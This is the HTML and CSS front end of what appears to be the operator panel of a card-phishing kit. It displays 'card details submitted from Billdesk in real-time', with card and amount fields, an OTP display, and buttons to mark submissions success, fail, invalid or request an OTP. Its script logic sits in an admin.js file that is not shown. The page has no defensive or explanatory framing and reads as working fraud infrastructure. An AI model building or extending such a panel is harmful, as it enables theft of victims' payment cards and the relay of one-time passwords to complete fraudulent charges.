<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel - Real-Time Card Submissions</title>
    <script src="https://cdn.socket.io/4.6.1/socket.io.min.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background: #000000;
            color: #ffffff;
            overflow-x: hidden;
        }

        .header {
            background: linear-gradient(135deg, #1a1a1a 0%, #000000 100%);
            padding: 20px 40px;
            border-bottom: 1px solid #333;
            display: flex;
            justify-content: space-between;
            align-items: center;
            position: sticky;
            top: 0;
            z-index: 100;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
        }

        .logo-section {
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .logo {
            font-size: 28px;
            font-weight: bold;
            color: #ffffff;
            text-shadow: 0 0 10px rgba(255, 255, 255, 0.3);
        }

        .status-section {
            display: flex;
            gap: 20px;
            align-items: center;
        }

        .status-indicator {
            display: flex;
            align-items: center;
            gap: 8px;
            padding: 8px 16px;
            background: #1a1a1a;
            border-radius: 20px;
            border: 1px solid #333;
        }

        .status-dot {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background: #00ff00;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }

        .status-text {
            font-size: 14px;
            color: #ffffff;
        }

        .connection-count {
            font-size: 14px;
            color: #888;
            background: #1a1a1a;
            padding: 8px 16px;
            border-radius: 20px;
            border: 1px solid #333;
        }

        .main-container {
            padding: 40px;
            max-width: 1600px;
            margin: 0 auto;
        }

        .page-title {
            font-size: 32px;
            font-weight: bold;
            margin-bottom: 10px;
            color: #ffffff;
        }

        .page-subtitle {
            font-size: 16px;
            color: #888;
            margin-bottom: 40px;
        }

        .submissions-grid {
            display: grid;
            gap: 20px;
        }

        .submission-card {
            background: linear-gradient(135deg, #1a1a1a 0%, #0d0d0d 100%);
            border: 1px solid #333;
            border-radius: 16px;
            padding: 30px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
            transition: all 0.3s ease;
            animation: slideIn 0.4s ease-out;
            position: relative;
            overflow: hidden;
        }

        .submission-card.new {
            border-color: #00ff00;
            box-shadow: 0 8px 32px rgba(0, 255, 0, 0.2);
            animation: slideIn 0.4s ease-out, glow 2s ease-in-out;
        }

        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(-20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        @keyframes glow {
            0%, 100% { box-shadow: 0 8px 32px rgba(0, 255, 0, 0.2); }
            50% { box-shadow: 0 8px 32px rgba(0, 255, 0, 0.5); }
        }

        .submission-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            padding-bottom: 20px;
            border-bottom: 1px solid #333;
        }

        .submission-id {
            font-size: 14px;
            color: #888;
            font-family: 'Courier New', monospace;
        }

        .submission-time {
            font-size: 12px;
            color: #666;
        }

        .student-info {
            margin-bottom: 20px;
        }

        .student-name {
            font-size: 20px;
            font-weight: bold;
            color: #ffffff;
            margin-bottom: 5px;
        }

        .student-details {
            font-size: 14px;
            color: #888;
        }

        .card-details-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 15px;
            margin-bottom: 25px;
        }

        .detail-item {
            background: #0d0d0d;
            padding: 15px;
            border-radius: 8px;
            border: 1px solid #222;
        }

        .detail-label {
            font-size: 12px;
            color: #888;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            margin-bottom: 5px;
        }

        .detail-value {
            font-size: 16px;
            color: #ffffff;
            font-weight: 500;
            font-family: 'Courier New', monospace;
        }

        .amount-section {
            grid-column: span 2;
            background: linear-gradient(135deg, #1a4d1a 0%, #0d260d 100%);
            border: 1px solid #2d5a2d;
        }

        .amount-value {
            font-size: 24px;
            color: #00ff00;
            font-weight: bold;
        }

        .commands-section {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            padding-top: 20px;
            border-top: 1px solid #333;
        }

        .command-btn {
            flex: 1;
            min-width: 120px;
            padding: 12px 20px;
            border: none;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            position: relative;
            overflow: hidden;
        }

        .command-btn::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            width: 0;
            height: 0;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.1);
            transform: translate(-50%, -50%);
            transition: width 0.6s, height 0.6s;
        }

        .command-btn:hover::before {
            width: 300px;
            height: 300px;
        }

        .command-btn:active {
            transform: scale(0.95);
        }

        .btn-success {
            background: linear-gradient(135deg, #00cc00 0%, #009900 100%);
            color: #ffffff;
            border: 1px solid #00ff00;
        }

        .btn-success:hover {
            background: linear-gradient(135deg, #00ff00 0%, #00cc00 100%);
            box-shadow: 0 4px 20px rgba(0, 255, 0, 0.4);
        }

        .btn-fail {
            background: linear-gradient(135deg, #cc0000 0%, #990000 100%);
            color: #ffffff;
            border: 1px solid #ff0000;
        }

        .btn-fail:hover {
            background: linear-gradient(135deg, #ff0000 0%, #cc0000 100%);
            box-shadow: 0 4px 20px rgba(255, 0, 0, 0.4);
        }

        .btn-invalid {
            background: linear-gradient(135deg, #cc6600 0%, #994d00 100%);
            color: #ffffff;
            border: 1px solid #ff8800;
        }

        .btn-invalid:hover {
            background: linear-gradient(135deg, #ff8800 0%, #cc6600 100%);
            box-shadow: 0 4px 20px rgba(255, 136, 0, 0.4);
        }

        .btn-otp {
            background: linear-gradient(135deg, #0066cc 0%, #004d99 100%);
            color: #ffffff;
            border: 1px solid #0088ff;
        }

        .btn-otp:hover {
            background: linear-gradient(135deg, #0088ff 0%, #0066cc 100%);
            box-shadow: 0 4px 20px rgba(0, 136, 255, 0.4);
        }

        .empty-state {
            text-align: center;
            padding: 100px 20px;
        }

        .empty-icon {
            font-size: 64px;
            margin-bottom: 20px;
            opacity: 0.3;
        }

        .empty-title {
            font-size: 24px;
            color: #888;
            margin-bottom: 10px;
        }

        .empty-subtitle {
            font-size: 16px;
            color: #666;
        }

        .status-badge {
            position: absolute;
            top: 15px;
            right: 15px;
            padding: 6px 12px;
            border-radius: 20px;
            font-size: 11px;
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .status-processing {
            background: #1a4d1a;
            color: #00ff00;
            border: 1px solid #2d5a2d;
        }

        .status-completed {
            background: #1a4d1a;
            color: #00ff00;
            border: 1px solid #00ff00;
        }

        .status-failed {
            background: #4d1a1a;
            color: #ff0000;
            border: 1px solid #ff0000;
        }

        .status-invalid {
            background: #4d331a;
            color: #ff8800;
            border: 1px solid #ff8800;
        }

        .new-badge {
            position: absolute;
            top: 15px;
            left: 15px;
            background: #00ff00;
            color: #000000;
            padding: 6px 12px;
            border-radius: 20px;
            font-size: 11px;
            font-weight: bold;
            text-transform: uppercase;
            animation: blink 1s ease-in-out infinite;
        }

        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }

        @media (max-width: 768px) {
            .header {
                flex-direction: column;
                gap: 15px;
            }

            .main-container {
                padding: 20px;
            }

            .card-details-grid {
                grid-template-columns: 1fr;
            }

            .commands-section {
                flex-direction: column;
            }

            .command-btn {
                width: 100%;
            }
        }

        .otp-display {
            background: #0d0d0d;
            padding: 15px;
            border-radius: 8px;
            border: 1px solid #0088ff;
            margin-top: 15px;
            display: none;
        }

        .otp-display.show {
            display: block;
            animation: slideDown 0.3s ease-out;
        }

        @keyframes slideDown {
            from {
                opacity: 0;
                transform: translateY(-10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .otp-label {
            font-size: 12px;
            color: #0088ff;
            text-transform: uppercase;
            margin-bottom: 5px;
        }

        .otp-value {
            font-size: 32px;
            color: #ffffff;
            font-weight: bold;
            font-family: 'Courier New', monospace;
            letter-spacing: 8px;
        }
    </style>
</head>
<body>
    <!-- Header -->
    <header class="header">
        <div class="logo-section">
            <div class="logo">âš¡ Admin Panel</div>
        </div>
        <div class="status-section">
            <div class="status-indicator">
                <div class="status-dot"></div>
                <span class="status-text">Live</span>
            </div>
            <div class="connection-count" id="connectionCount">
                Connections: 0
            </div>
        </div>
    </header>

    <!-- Main Container -->
    <div class="main-container">
        <h1 class="page-title">Real-Time Card Submissions</h1>
        <p class="page-subtitle">Monitor and manage card details submitted from Billdesk in real-time</p>

        <!-- Submissions Grid -->
        <div class="submissions-grid" id="submissionsGrid">
            <!-- Empty State -->
            <div class="empty-state" id="emptyState">
                <div class="empty-icon">ðŸ’³</div>
                <div class="empty-title">No Submissions Yet</div>
                <div class="empty-subtitle">Card submissions will appear here in real-time</div>
            </div>
        </div>
    </div>

    <script src="admin.js"></script>
</body>
</html>
